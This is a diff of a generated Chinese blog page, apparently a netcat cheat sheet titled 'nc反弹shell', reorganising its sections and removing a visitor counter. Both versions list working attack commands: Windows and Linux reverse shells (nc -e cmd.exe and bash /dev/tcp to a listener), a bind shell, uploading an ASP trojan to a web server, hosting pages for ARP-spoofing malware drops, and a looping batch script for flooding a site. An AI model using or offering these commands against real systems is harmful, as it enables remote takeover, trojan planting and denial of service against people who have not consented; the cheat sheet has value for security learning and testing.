@@ -16,17 +16,17 @@
   <meta name="author" content="Ninja">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0x01 简介nc被誉为网络中的瑞士军刀,nc的用途和使用方法多种多样。 0x02 参数123456789101112131415-h  查看帮助信息   -d  后台模式   -e  prog程序重定向，一但连接就执行［危险］  -i  secs延时的间隔  -l  监听模式，用于入站连接   -L  监听模式，连接天闭后仍然继续监听，直到CTR+C   -n  IP地址，不能用域名   -o">
+    <meta name="description" content="0、简介nc被誉为网络中的瑞士军刀,nc的用途和使用方法多种多样。 参数： 123456789101112131415-h  查看帮助信息   -d  后台模式   -e  prog程序重定向，一但连接就执行［危险］  -i  secs延时的间隔  -l  监听模式，用于入站连接   -L  监听模式，连接天闭后仍然继续监听，直到CTR+C   -n  IP地址，不能用域名   -o  film记">
 <meta property="og:type" content="article">
 <meta property="og:title" content="nc反弹shell">
 <meta property="og:url" content="http://example.com/2019/11/18/nc%E5%8F%8D%E5%BC%B9shell/index.html">
 <meta property="og:site_name" content="Ninja&#39;s blog">
-<meta property="og:description" content="0x01 简介nc被誉为网络中的瑞士军刀,nc的用途和使用方法多种多样。 0x02 参数123456789101112131415-h  查看帮助信息   -d  后台模式   -e  prog程序重定向，一但连接就执行［危险］  -i  secs延时的间隔  -l  监听模式，用于入站连接   -L  监听模式，连接天闭后仍然继续监听，直到CTR+C   -n  IP地址，不能用域名   -o">
+<meta property="og:description" content="0、简介nc被誉为网络中的瑞士军刀,nc的用途和使用方法多种多样。 参数： 123456789101112131415-h  查看帮助信息   -d  后台模式   -e  prog程序重定向，一但连接就执行［危险］  -i  secs延时的间隔  -l  监听模式，用于入站连接   -L  监听模式，连接天闭后仍然继续监听，直到CTR+C   -n  IP地址，不能用域名   -o  film记">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/20191118202760.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191118214242-1719818490555-1.png">
 <meta property="article:published_time" content="2019-11-18T14:27:25.000Z">
-<meta property="article:modified_time" content="2024-07-01T10:08:48.021Z">
+<meta property="article:modified_time" content="2024-07-01T12:34:32.971Z">
 <meta property="article:author" content="Ninja">
 <meta property="article:tag" content="反弹shell">
 <meta name="twitter:card" content="summary_large_image">
@@ -74,7 +74,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -237,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          525 字
+          533 字
         
       </span>
     
@@ -298,10 +298,13 @@
             
               <div class="markdown-body">
                 
-                <h4 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h4><p>nc被誉为网络中的瑞士军刀,nc的用途和使用方法多种多样。</p>
-<h4 id="0x02-参数"><a href="#0x02-参数" class="headerlink" title="0x02 参数"></a>0x02 参数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">-h  查看帮助信息   <br>-d  后台模式   <br>-e  prog程序重定向，一但连接就执行［危险］  <br>-i  secs延时的间隔  <br>-l  监听模式，用于入站连接   <br>-L  监听模式，连接天闭后仍然继续监听，直到CTR+C   <br>-n  IP地址，不能用域名   <br>-o  film记录16进制的传输   <br>-p  [空格]端口 本地端口号   <br>-r  随机本地及远程端口  <br>-t  使用Telnet交互方式   <br>-u  UDP模式  <br>-v  详细输出，用-vv将更详细   <br>-w  数字 <span class="hljs-built_in">timeout</span>延时间隔   <br>-z  将输入，输出关掉（用于扫锚时）<br></code></pre></td></tr></table></figure>
+                <h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>nc被誉为网络中的瑞士军刀,nc的用途和使用方法多种多样。</p>
+<p><strong>参数：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">-h  查看帮助信息   <br>-d  后台模式   <br>-e  prog程序重定向，一但连接就执行［危险］  <br>-i  secs延时的间隔  <br>-l  监听模式，用于入站连接   <br>-L  监听模式，连接天闭后仍然继续监听，直到CTR+C   <br>-n  IP地址，不能用域名   <br>-o  film记录16进制的传输   <br>-p  [空格]端口 本地端口号   <br>-r  随机本地及远程端口  <br>-t  使用Telnet交互方式   <br>-u  UDP模式  <br>-v  详细输出，用-vv将更详细   <br>-w  数字 <span class="hljs-built_in">timeout</span>延时间隔   <br>-z  将输入，输出关掉（用于扫锚时）<br></code></pre></td></tr></table></figure>
 
-<h4 id="0x03-使用方法"><a href="#0x03-使用方法" class="headerlink" title="0x03 使用方法"></a>0x03 使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#扫描端口 </span><br>nc.exe -nvv -w2 -z 192.168.199.111 3385-3399 <br><span class="hljs-comment">#Windows反弹shell</span><br>nc.exe -lvp 8888                                                   //监听 <br>nc.exe -t -e cmd.exe 192.168.199.152 8888                          //反弹<br><span class="hljs-comment">#Linux反弹shell</span><br>nc -lvp 8888                                           //监听 <br>bash -i &gt;&amp; /dev/tcp/192.168.199.111/8888 0&gt;&amp;1          //反弹<br><span class="hljs-comment">#做蜜罐，不停地监听3389端口,把结果输出到c:\log.txt  </span><br>nc -L -p 3389&gt;c:\log.txt<br><span class="hljs-comment">#监听3389端口,并把payload.txt中的内容发给连接本端口的主机，可起到传送文件作用.(此用法常用于反向溢出) </span><br>nc -L -p 3389&lt;c:\payload.txt<br><span class="hljs-comment">#绑定主机的cmd到8888端口，并以TELNET方式应答</span><br>nc -l -p 8888 -t -e cmd.exe<br>绑定cmd反向连接192.168.199.111的888端口以TELNET方式应答<br>nc -t -e cmd.exe 192.168.199.111 888<br><span class="hljs-comment">#上传ASP木马</span><br>nc -vv www.xx.com 80&lt;xx.asp<br><span class="hljs-comment">#向192.168.0.1发送1.txt中的内容</span><br>nc -nvv 192.168.199.111 80&lt;1.txt<br><span class="hljs-comment">#NC架设简单的HTTP服务器</span><br>nc -l -p 80&lt;index.html  //index.htm为主页文件<br><br>注：此法只能架设简单的HTTP服务器，只有一个主页页面，多人访问还会假死。<br>所以只能玩玩用。(但是此法经常用于局域网ARP欺骗挂马架设简易HTTP)<br><br><span class="hljs-comment">#利用NC进行DDOS攻击</span><br>nc -vv www.xxx.com 80&lt;1.txt    //1.txt中为垃圾信息<br><br>注：可以简单的用一个批处理实现循环攻击<br>    @<span class="hljs-built_in">echo</span> off  <br>    color a  <br>    :1  <br>    cls  <br>    nc -vv www.xxx.com 80&lt;1.txt  <br>    goto 1 <br><br></code></pre></td></tr></table></figure>
+<h4 id="1、使用方法"><a href="#1、使用方法" class="headerlink" title="1、使用方法"></a>1、使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#扫描端口 </span><br>nc.exe -nvv -w2 -z 192.168.199.111 3385-3399 <br><span class="hljs-comment">#Windows反弹shell</span><br>nc.exe -lvp 8888                                                   //监听 <br>nc.exe -t -e cmd.exe 192.168.199.152 8888                          //反弹<br><span class="hljs-comment">#Linux反弹shell</span><br>nc -lvp 8888                                           //监听 <br>bash -i &gt;&amp; /dev/tcp/192.168.199.111/8888 0&gt;&amp;1          //反弹<br></code></pre></td></tr></table></figure>
+
+<h4 id="2、进阶使用"><a href="#2、进阶使用" class="headerlink" title="2、进阶使用"></a>2、进阶使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#做蜜罐，不停地监听3389端口,把结果输出到c:\log.txt  </span><br>nc -L -p 3389&gt;c:\log.txt<br><span class="hljs-comment">#监听3389端口,并把payload.txt中的内容发给连接本端口的主机，可起到传送文件作用.(此用法常用于反向溢出) </span><br>nc -L -p 3389&lt;c:\payload.txt<br><span class="hljs-comment">#绑定主机的cmd到8888端口，并以TELNET方式应答</span><br>nc -l -p 8888 -t -e cmd.exe<br>绑定cmd反向连接192.168.199.111的888端口以TELNET方式应答<br>nc -t -e cmd.exe 192.168.199.111 888<br><span class="hljs-comment">#上传ASP木马</span><br>nc -vv www.xx.com 80&lt;xx.asp<br><span class="hljs-comment">#向192.168.0.1发送1.txt中的内容</span><br>nc -nvv 192.168.199.111 80&lt;1.txt<br><span class="hljs-comment">#NC架设简单的HTTP服务器</span><br>nc -l -p 80&lt;index.html  //index.htm为主页文件<br><br>注：此法只能架设简单的HTTP服务器，只有一个主页页面，多人访问还会假死。<br>所以只能玩玩用。(但是此法经常用于局域网ARP欺骗挂马架设简易HTTP)<br><br><span class="hljs-comment">#利用NC进行DDOS攻击</span><br>nc -vv www.xxx.com 80&lt;1.txt    //1.txt中为垃圾信息<br><br>注：可以简单的用一个批处理实现循环攻击<br>    @<span class="hljs-built_in">echo</span> off  <br>    color a  <br>    :1  <br>    cls  <br>    nc -vv www.xxx.com 80&lt;1.txt  <br>    goto 1 <br></code></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/20191118202760.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191118214242-1719818490555-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
@@ -470,30 +473,6 @@
        <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
     </div>
   
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="busuanzi_container_site_pv" style="display: none">
-        总访问量 
-        <span id="busuanzi_value_site_pv"></span>
-         次
-      </span>
-    
-    
-      <span id="busuanzi_container_site_uv" style="display: none">
-        总访客数 
-        <span id="busuanzi_value_site_uv"></span>
-         人
-      </span>
-    
-    
-  
-</div>
-
   
   
   
